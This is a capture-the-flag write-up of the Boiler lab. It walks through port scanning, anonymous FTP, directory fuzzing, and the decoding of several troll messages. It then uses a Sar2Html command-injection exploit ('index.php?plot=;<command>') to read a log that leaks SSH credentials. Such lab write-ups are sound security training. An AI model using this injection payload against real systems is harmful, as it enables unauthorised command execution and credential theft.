# Boiler CTF

Intermediate level CTF. Just enumerate, you'll get there.

## Enumeration

### Nmap

Initial Nmap scan found the following:

```
PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open http syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
55007/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

While running a fuff directory scan on the web server I checked out the other
ports:

### FTP

We gained access to the FTP server using an anynomous login.
We found a file called .info.txt which contained the following:

```
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Which seems like a encoded message and using dencode I found out that is
was encoded using ROT13 and the message was:

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`
```

lol guess we were trolled.

### Webmin

I was not familiar with Webmin but reading the documentation I found out that
it is a web-based interface for system administration for Unix.

Opening the IP on port 10000 we accessed the webmin interface and we found a
login page. We tried the default credentials of root:root but they did not
work, darn. I'll keep looking around and return later in case of a hint
or to brute force the login.

### SSH

An SSH port but we currently don't have any credentials to login.

### Fuff

With fuff we managed to find a robots.txt file which contained the following:

```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

None of the directories seemed to be accessible but the last line seemed like
an encoded message. Using the numbers with their corresponding ASCII values we
get:

```
OTliMDY2MGNgOTVhZGVhMzIYzU0MTgYmFhNTQzYmFhMzIzYzUwYmMzYmY0NTY
```

Which gives us a base64 encoded message.
Decoding it we get:

```
99b0660cd95adea327c54182baa51584
```

Which seemed like a hash and using a rainbow table we found the word

```
kidding
```

lol damn we propably got trolled again.

The message for this room said to keep enumerating so thats what I will do...
And after quite a while of fuzzing I finally found:

```
[Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 48ms]
    * FIRST: joomla
    * SECOND: images
```

Now /joomla/images only gave us a blank page but now we have something to go by.
Having never heard of Joomla before I did some googling and found out that it
is a content management system (CMS) that allows you to build websites. So we
keep enumerating using joomla joomla/FUZZ and shortly we find a lot of stuff.

```
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 54ms]
index.php               [Status: 200, Size: 12478, Words: 772, Lines: 259, Duration: 331ms]
media                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 50ms]
templates               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 50ms]
modules                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 50ms]
tests                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 50ms]
bin                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 49ms]
plugins                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 51ms]
includes                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 49ms]
language                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 70ms]
README.txt              [Status: 200, Size: 4793, Words: 479, Lines: 72, Duration: 52ms]
components              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 50ms]
cache                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 48ms]
libraries               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 48ms]
robots.txt              [Status: 200, Size: 829, Words: 82, Lines: 32, Duration: 52ms]
build                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 51ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 58ms]
tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 50ms]
layouts                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 49ms]
administrator           [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 48ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
htaccess.txt            [Status: 200, Size: 3159, Words: 449, Lines: 86, Duration: 51ms]
cli                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 63ms]
_files                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 52ms]
.html                   [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 49ms]
.php                    [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 53ms]
```

I start by exploring the index.php page to get aquanted with the site. There is
a pretty standard looking site with a login page but there doesn't seem to be
any default passwords for Joomla sites.

After that I just keep going through each folder and file. Most of them are empty
or just standard files and scripts.

But then we check \_files and find a code

```
VjJodmNITnBaU0JrWVdsemVRbz0K
```

I check rainbow tables and we get a hit!

```
VjJodmNITnBaU0JrWVdsemVRbz0K:V2hvcHNpZSBkYWlzeQo=
```

Which seems to be a base64 encoded message. Decoding it we get:

```
Whopsie daisy

```

Not again lol...

Out of ideas on how to proceed I decide to run another directory scan with Fuff
with a bigger wordlist but found nothing new. Thinking I was missing something
or this joomla pages was just a red herring I gave it one last attempt fuzzing
using and underscore like the \_files folder had and found:

```
archive                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 55ms]
files                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 51ms]
test                    [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 49ms]
database                [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 72ms]
```

Starting with archive we found the message:

```
Mnope, nothin to see.
```

Not much but maybe we are onto something here since both \_files and \_archive
had custom messages.

Checking \_test I found something called Sar2Html. Googling it to find out what
it is and the first hit is an remote code execution exploit for version 3.2.1.

```
https://www.exploit-db.com/exploits/47204

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.
```

Not sure if the version running is vulnerable but I try it just in case and
it works like a charm. We run ls and see a file called log.txt. We cat it
and find the following message:

```
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1
port 49824 ssh2 #pass: superduperp@$$
```
